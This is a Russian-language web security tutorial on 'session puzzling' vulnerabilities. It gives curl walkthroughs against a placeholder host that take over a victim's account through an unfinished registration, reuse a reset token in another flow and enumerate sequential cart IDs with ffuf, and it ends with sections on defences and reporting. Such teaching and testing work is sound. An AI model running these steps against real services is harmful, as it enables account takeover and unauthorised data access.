Session puzzling (путаница состояний сессии) — это класс уязвимостей, при которых приложение использует одну и ту же сессию или серверный объект для разных целей и в разном порядке, и атакующий этим пользуется. В отличие от фиксации сессии, здесь проблема не в том, что идентификатор навязан, а в том, что **данные в сессии переиспользуются непредсказуемо**: один и тот же ключ пишут разные части приложения, а читают в неподходящий момент. Результат — обход проверок, повышение привилегий, подмена пользователя.

## Суть: один объект — разные роли

Представьте приложение, где сессия используется и для «анонимной корзины», и для «залогиненного пользователя». Если приложение не разделяет эти состояния, можно «протащить» анонимные данные в аутентифицированный контекст или наоборот. Ещё пример: сессия хранит `user_id`, который устанавливается на разных этапах (при регистрации, при логине, при смене пароля), и если порядок вызовов не контролируется, можно подставить чужой `user_id`.

Типичные сценарии: приложение пишет в сессию данные до аутентификации (черновик, временный токен), а после — доверяет им; разные эндпоинты используют одинаковые ключи сессии; серверный объект (например, корзина или заказ) создаётся по предсказуемому ID и переиспользуется.

## Сценарий 1: незавершённая регистрация

Классика: приложение на шаге 1 (ввод email) создаёт сессию с полем `pending_user`, а на шаге 2 (установка пароля) доверяет ему. Атакующий может начать регистрацию, затем навязать сессию другому пользователю.

```bash
# 1. начинаем регистрацию
curl -s -c jar -X POST https://t/register/step1 -d 'email=attacker@x.com'
# сервер кладёт в сессию pending_user=attacker
# 2. если сессия фиксируема/переиспользуема, подставляем её жертве
# 3. завершаем установку пароля на аккаунт, который «привяжется» к сессии
curl -s -b jar -X POST https://t/register/step2 -d 'password=Pwn1!'
```

Если после этого вы вошли в аккаунт с email жертвы — это session puzzling.

## Сценарий 2: переиспользование ключей

Приложение хранит в сессии `token` для сброса пароля и тот же ключ использует для подтверждения email. Тогда токен сброса можно применить для подтверждения (или наоборот), обходя проверки.

```bash
# токен, полученный для одного действия, пробуем в другом
curl -s -b jar -X POST https://t/confirm-email -d "token=$RESET_TOKEN"
```

## Сценарий 3: серверные объекты по предсказуемому ID

Иногда сессия ссылается на серверный объект (заказ, корзина, черновик), созданный с последовательным ID. Атакующий создаёт объект, узнаёт ID, и подставляет его (или перебирает) для доступа к чужому.

```bash
# создаём заказ, получаем id=1001
curl -s -b jar -X POST https://t/cart -d 'item=1'    # -> {"cart_id":1001}
# пробуем чужой
curl -s -b jar "https://t/cart/1002"
```

## Сценарий 4: гонки в состоянии сессии

Если приложение асинхронно обновляет сессию (например, при OAuth-редиректе), можно успеть вставить своё значение между шагами. Это смежная область с race conditions.

## Как искать session puzzling

Начните с карты флоу: регистрация, логин, OAuth, сброс пароля, MFA, смена email, подтверждение. Для каждого выпишите, какие ключи сессии пишутся и читаются. Ищите ключи, которые используются более чем в одном флоу, и ключи, которые пишутся до аутентификации, а читаются после.

```bash
# наблюдаем за cookie на каждом шаге флоу
for url in /register/step1 /register/step2 /login /reset; do
  echo "== $url"; curl -s -i -c jar -b jar -X POST "https://t$url" -d 'x=1' | grep -i set-cookie
done
# сравниваем значения cookie между шагами
```

Затем экспериментируйте с порядком: выполните шаги в необычном порядке, начните флоу A и завершите флоу B, используйте сессию от одного действия в другом.

## Разобранный пример: захват аккаунта через незавершённую регистрацию

```bash
# 1. стартуем регистрацию на свой email, получаем сессию
$ curl -s -c jar -X POST https://t/register/step1 -d 'email=attacker@evil.com'
$ grep -i sess jar
sess=AAAA1111

# 2. жертва «случайно» использует ту же сессию (фиксация/навязывание),
#    либо сессия предсказуема -> берём её
# 3. завершаем регистрацию, но подменяем email на жертву в шаге 2
$ curl -s -b 'sess=AAAA1111' -X POST https://t/register/step2 -d 'email=victim@corp.com&password=Pwn1!'
# 4. логинимся жертвой
$ curl -s -c j2 -X POST https://t/login -d 'email=victim@corp.com&password=Pwn1!'
$ curl -s -b j2 https://t/me | grep email
victim@corp.com         # аккаунт захвачен
```

Артефакт — доступ к аккаунту с email жертвы.

## Разобранный пример: токен одного флоу в другом

```bash
# 1. запрашиваем сброс пароля (получаем токен в сессии)
$ curl -s -c jar -X POST https://t/forgot -d 'email=me@x.com'
# сервер: sess[reset_token]=R1
# 2. используем reset_token как email-confirm токен
$ curl -s -b jar -X POST https://t/confirm-email -d "token=R1"
{"ok":true}            # токен принят в чужом флоу -> session puzzling
```

## Инструменты

```bash
# Burp: сравнивать cookie между запросами (Comparer)
# отслеживать серверные ID
curl -s -b jar https://t/cart | jq '.cart_id'
# параллельные запросы (гонки)
ffuf -w ids.txt -u 'https://t/cart/FUZZ' -b 'sess=...' -mc all -fc 404
# автоматизация последовательностей — Burp Turbo Intruder / python-requests
```

## Крайние случаи и подводные камни

- **Разные флоу — один ключ.** Проверяйте каждый ключ на пересечение флоу.
- **Порядок шагов.** Приложение может полагаться на порядок; нарушьте его.
- **Предсказуемые ID.** Последовательные/временные ID серверных объектов — кандидаты.
- **Гонки.** Асинхронные обновления сессии открывают окно.
- **Кэш/редиректы** могут «залипать» на сессии.
- **CSRF-токены** иногда переиспользуются и тоже ведут к puzzling.

## Что делать дальше / решение

1. **Составьте карту флоу** — какие ключи сессии пишутся/читаются.
2. **Найдите пересечения** — один ключ в разных флоу.
3. **Экспериментируйте с порядком** — завершайте флоу чужими шагами.
4. **Проверьте серверные объекты** — предсказуемость ID.
5. **Проверьте гонки** — параллельные обновления.
6. **Доведите до артефакта** — чужой аккаунт или привилегия.
7. **Тупик** — переходите к session fixation/CSRF.

## Глубже: session puzzling vs session fixation

Эти два класса часто путают, но у них разная механика. **Session fixation** — атакующий навязывает жертве известный ему идентификатор сессии до аутентификации, а после логина приложение «поднимает» эту сессию до аутентифицированной, и атакующий получает доступ. Защита — смена идентификатора при логине (`session_regenerate_id` в PHP, `session().cycle()` в Rails, аналог в других фреймворках).

**Session puzzling** — идентификатор может быть вполне легитимным, но данные внутри него переиспользуются неправильно: разные флоу пишут и читают одни и те же ключи, а порядок не контролируется. Защита — разделять состояния (отдельные ключи для разных флоу), очищать временные данные после использования, не доверять данным, записанным до аутентификации, и привязывать challenge/токены к конкретному действию и сессии.

Понимание разницы важно, потому что защита разная: от фиксации помогает ротация ID, а от puzzling — дисциплина ключей и порядок. Проверяйте обе: сначала смотрите, меняется ли ID при логине, затем — не переиспользуются ли ключи между флоу.

## Глубже: как приоритизировать находки

Session puzzling — семейство, а не одна уязвимость, поэтому оценивайте каждую находку по последствиям. Если удаётся захватить чужой аккаунт (подменить email/пароль/идентификатор) — это критично. Если удаётся обойти MFA или повысить привилегию — высоко. Если только получить чужой серверный объект (корзину, черновик) — средний уровень в зависимости от чувствительности. Если удаётся лишь «сломать» свой собственный флоу — низко.

При отчёте описывайте **точный порядок шагов**, который приводит к эффекту: «начать регистрацию на email A, затем завершить шаг 2 с email B, затем войти с паролем B». Воспроизводимость — главное: эксперт должен повторить ваш PoC без догадок. И фиксируйте артефакт — доступ к чужому аккаунту или объекту.

## Итог

Session puzzling опасен тем, что не выглядит как уязвимость: код «работает», но порядок и переиспользование ключей сессии дают атакующему лишние возможности. Ищите пересечения флоу, экспериментируйте с порядком шагов, проверяйте предсказуемость серверных ID и гонки. И не забывайте про разницу с фиксацией: там — ротация ID, здесь — дисциплина ключей. Найденный захват чужого аккаунта — критичная находка, и её PoC должен воспроизводиться пошагово.

## Практические советы

Ведите журнал флоу: для каждого шага фиксируйте, какие cookie/ключи сессии появляются и меняются, какие серверные объекты создаются и с какими ID. Это превращает «магию» в схему, по которой видны пересечения. Используйте Burp Comparer, чтобы сравнивать ответы и cookie между шагами: одинаковые ключи с разными значениями — сигнал переиспользования. Для гонок применяйте параллельные запросы (Turbo Intruder, `ffuf` с одинаковым телом) и смотрите, не «проскакивает» ли проверка. И всегда пробуйте нестандартный порядок: начать один флоу и завершить другим, использовать сессию от одного действия в другом. Именно порядок и переиспользование — суть session puzzling, и большинство находок рождаются из экспериментов с последовательностью, а не из чтения кода.

## Где пригодится

- **CTF (Web):** задачи на неочевидную логику сессий.
- **Bug bounty:** эскалация привилегий через состояние — редкий, но ценный баг.
- **Пентест:** аудит серверных сессий.
- **Работа (AppSec):** изоляция пространств имён, сброс сессии при logout, нормализация значений.
